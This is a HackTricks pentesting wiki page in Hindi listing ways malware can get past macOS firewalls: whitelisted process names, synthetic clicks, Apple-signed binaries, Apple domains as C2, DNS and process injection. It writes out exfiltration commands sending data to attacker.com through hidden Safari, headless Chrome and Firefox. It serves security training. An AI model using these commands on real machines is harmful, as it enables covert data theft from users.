# macOS फ़ायरवॉल को छलकरना

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## पाए गए तकनीक

निम्नलिखित तकनीकों को कुछ macOS फ़ायरवॉल ऐप्स में काम करते पाया गया।

### सफेद सूची नामों का दुरुपयोग

* उदाहरण के लिए मैलवेयर को **`launchd`** जैसे जाने-माने macOS प्रक्रियाओं के नामों से बुलाना

### सिंथेटिक क्लिक

* अगर फ़ायरवॉल उपयोगकर्ता से अनुमति के लिए पूछता है तो मैलवेयर को **अनुमति पर क्लिक करने** के लिए

### **एप्पल द्वारा हस्ताक्षरित बाइनरी का उपयोग**

* जैसे **`curl`**, लेकिन अन्य भी जैसे **`whois`**

### जाने-माने एप्पल डोमेन

फ़ायरवॉल को जाने-माने एप्पल डोमेन्स जैसे **`apple.com`** या **`icloud.com`** कनेक्शन की अनुमति हो सकती है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।

### सामान्य छलकरना

फ़ायरवॉल को छलकरने के लिए कुछ विचार

### अनुमति प्राप्त ट्रैफ़िक की जाँच

अनुमति प्राप्त ट्रैफ़िक को जानना आपको पोटेंशियली सफेद सूची डोमेन या जिन एप्लिकेशन्स को उन डोमेनों तक पहुंचने की अनुमति है, उन्हें पहचानने में मदद करेगा।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS निर्धारण **`mdnsreponder`** साइन की गई एप्लिकेशन के माध्यम से किया जाता है जिसे संभावित रूप से DNS सर्वर से संपर्क करने की अनुमति दी जाएगी।

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ब्राउज़र ऐप्स के माध्यम से

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* गूगल क्रोम

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* फ़ायरफ़ॉक्स
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* सफारी
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### प्रक्रिया इंजेक्शन के माध्यम से

यदि आप **कोड को किसी प्रक्रिया में इंजेक्ट** कर सकते हैं जो किसी सर्वर से कनेक्ट करने की अनुमति देती है तो आप फ़ायरवॉल सुरक्षा को छल सकते हैं:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## संदर्भ

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
